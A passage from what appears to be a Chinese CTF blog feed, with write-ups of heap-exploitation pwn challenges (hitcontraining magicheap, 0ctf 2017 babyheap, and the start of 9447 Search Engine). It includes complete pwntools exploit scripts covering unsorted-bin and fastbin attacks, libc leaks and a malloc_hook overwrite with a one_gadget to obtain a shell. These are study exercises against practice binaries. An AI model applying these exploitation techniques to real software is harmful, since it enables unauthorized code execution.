href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/heap&gt; checksec magicheap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/heap/magicheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没什么好说的，有后门函数，edit堆时存在堆溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们刚说的漏洞屁用没有，就是可以随意把一个地址改一个大数字</p><p>注意不被topchunk合并，溢出把bk覆盖为magic-0x10，剩下交给管理器就行了</p><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321154447592.png" alt="image-20230321154447592"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">create_heap(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017-0ctf-babyheap</title>
      <link href="/2023/03/20/2017-0ctf-babyheap/"/>
      <url>/2023/03/20/2017-0ctf-babyheap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec babyheap </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/babyheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>刚开始的init_my会利用&#x2F;dev&#x2F;urandom随机函数用mmap随机映射一块内存给我们存放指针，没有了确定地址，我们就不好去构成unlink攻击</p><p>allocate()根据我们输入的size构成如下一个结构体，把指针放在mmap的堆上</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> chunk           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> ptr             dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> chunk           ends</span><br></pre></td></tr></table></figure><p>fill()也会根据我们的size进行读写，任意堆溢出，这就好办了</p><p>freechunk()挺好的,该置零的都置零</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">a1[v2].size = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">result = (__int64)&amp;a1[v2];</span><br><span class="line">*(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h2 id="unsort-bin泄露libc"><a href="#unsort-bin泄露libc" class="headerlink" title="unsort bin泄露libc"></a>unsort bin泄露libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>这里我们申请五个堆</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817100944060.png" alt="image-20230817100944060"></p><p>我们free(2)free(1)后形成单链表</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103408525.png" alt="image-20230320103408525"></p><p>由于我们可以利用堆溢出chunk0去一改写chunk1，改写1的fd为，由于堆一般都是以4k对齐的，我们可以根据申请堆的大小猜测处chunk2和chunk4只有最后一个字节0x80的差距</p><p><code>payload = 0x10 * b&#39;a&#39; + p64(0) + p64(0x21) + p8(0x80)</code>即可</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103540783.png" alt="image-20230320103540783"></p><p>这样我们申请两次就可以拿到chunk4，我们需要改写大小绕过fastbin0x20的检测</p><p>堆溢出chunk3即可<code>payload = 0x10 * b&#39;b&#39; + p64(0) + p64(0x21)</code></p><p>allocate(0x10)<br>allocate(0x10)</p><p>把chunk2分配到chunk4数据区</p><p>这时候释放chunk4之前，要再申请一个堆防止unsorted bin的chunk4与topchunk合并，并把chunk4的大小溢出为0x91进入unsortedbin，输出chunk2就能拿到unsortbin地址</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101003145.png" alt="image-20230817101003145"></p><p>通过固定偏移找到libc基址</p><h2 id="切割chunk-malloc-hook"><a href="#切割chunk-malloc-hook" class="headerlink" title="切割chunk malloc_hook"></a>切割chunk malloc_hook</h2><p>这个时候我们的chunk2是可以控制chunk4的data区，这就需要我们把chunk4丢到fastbin的链表中，实现任意地址malloc，但是chunk4现在再unsortbin的循环链表里</p><p>我们可以利用ptmalloc2特性<strong>当fastbin大小里没有合适大小的chunk，会去unsorted bin找合适大小的块或者切割合适大小的块</strong></p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">void</span>* x = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止和topchunk合并</span></span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">    <span class="type">void</span>* y = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br></pre></td></tr></table></figure><p>malloc(0x10)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320111817704.png" alt="image-20230320111817704"></p><p>free(x)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101021289.png" alt="image-20230817101021289"></p><p>void* y &#x3D; malloc(0x60);</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101219838.png" alt="image-20230817101219838"></p><p>可以看到直接分割</p></blockquote><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103948398.png" alt="image-20230320103948398"></p><p>0x7f我们需要伪造0x60大小chunk，直接一步达到要求</p><p>allocate(0x60) #idx4<br>free(4)</p><p>再把fakechunk写入</p><p>ake_chunk_addr &#x3D; main_arena - 0x33<br>fake_chunk &#x3D; p64(fake_chunk_addr)<br>fill(2, len(fake_chunk), fake_chunk)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320112319902.png" alt="image-20230320112319902"></p><p>allocate(0x60)  # idx 4<br>allocate(0x60)  # idx 6</p><p>得到chunk</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>写入onegadget</p><p>one_gadget_addr &#x3D; libc + 0x4526a<br>payload &#x3D; 0x13 * b’a’ + p64(one_gadget_addr)<br>fill(6, len(payload), payload)</p><p>继续跑路</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320110015505.png" alt="image-20230320110015505"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./babyheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28529&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 2</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment"># idx5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line">one_gadget_addr = libc + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Malloc Hook </tag>
            
            <tag> Split Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arbitrary Alloc 2015 9447 CTF:Search Engine</title>
      <link href="/2023/03/19/2015-9447-CTF-Search-Engine/"/>
      <url>/2023/03/19/2015-9447-CTF-Search-Engine/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec search </span><br><span class="line">[*] <span class="string">&#x27;/home/grxer/Desktop/pwn/heap/search&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>这道题静态分析起来挺复杂的，自定义的输入函数，各种阻力，最后配合gdb动态才搞明白</p><p>index_sentence()读取用户输入size长度的sentence，他还会用下面的结构把每个句子的单词分开构成一个单链表，单链表的content是从sentence地址上原数据地址，表头在0x6020B8，单链表表头是最后一个单词</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> word_struct     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> content         dq ?单词</span><br><span class="line"><span class="number">00000008</span> size            dd ?单词</span><br><span class="line"><span class="number">0000000</span>C padding1        dd ?</span><br><span class="line"><span class="number">00000010</span> sentence_ptr    dq ?句子                 ; offset</span><br><span class="line"><span class="number">00000018</span> len             dd ?整个句子</span><br><span class="line"><span class="number">0000001</span>C padding2        dd ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> word_struct     ends</span><br></pre></td></tr></table></figure><p>这里由于空间复用其实heap manger给我们0x30大小chunk</p><p>search_word()读取一个输入长度比较<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(i-&gt;sentence_ptr, <span class="number">0</span>, i-&gt;len);</span><br><span class="line"><span class="built_in">free</span>(i-&gt;sentence_ptr);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Deleted!&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里找到之前把整个句子都给置零了，也没有free后置null，但是我们的struct地址都还在用，就从这里开始把</p><h2 id="unsorted-bin泄露libc"><a href="#unsorted-bin泄露libc" class="headerlink" title="unsorted bin泄露libc"></a>unsorted bin泄露libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">smallbin_sentence = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们这样会申请到三个堆，一个sentence两个word，‘ b’-&gt;‘a’*0x85，我们search(‘b’)，释放掉sentence堆，这个时候申请到的chunk大小0x90超过了fastbin，进入unsortbin，unsorted bin是个双向循环列表所以释放chunk的fd和bk会填上，unsortedbin的开始</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png" alt="image-20230319221406963"></p><p>__由于释放后单链表还存在我们再次search,<code>if ( *i-&gt;sentence_ptr )</code>i-&gt;sentence_ptr是sentence chunk的fd指针被填上了unsorted bin绕过__，为了绕过<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code>，第一个我们的size还是1，由于memset(i-&gt;sentence_ptr, 0, i-&gt;len)会把整个句子置零，搜索0即可绕过,<code>fwrite(i-&gt;sentence_ptr, 1uLL, i-&gt;len, stdout);</code>会配合我们输出处bk和fd</p><p>unsorted bin地址距离main_arena,main_arena是glibc里的一个全局变量，偏移固定0x3C4B20，所以我们可以得到libc</p><h2 id="fastbin循环链表"><a href="#fastbin循环链表" class="headerlink" title="fastbin循环链表"></a>fastbin循环链表</h2><p>由于free后没有置零，我们可以doublefree，构成循环链表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>都free后a-&gt;b-&gt;c-&gt;0</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234446142.png" alt="image-20230319234446142"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br></pre></td></tr></table></figure><p>再次free，这里的c是过不了if ( *i-&gt;sentence_ptr 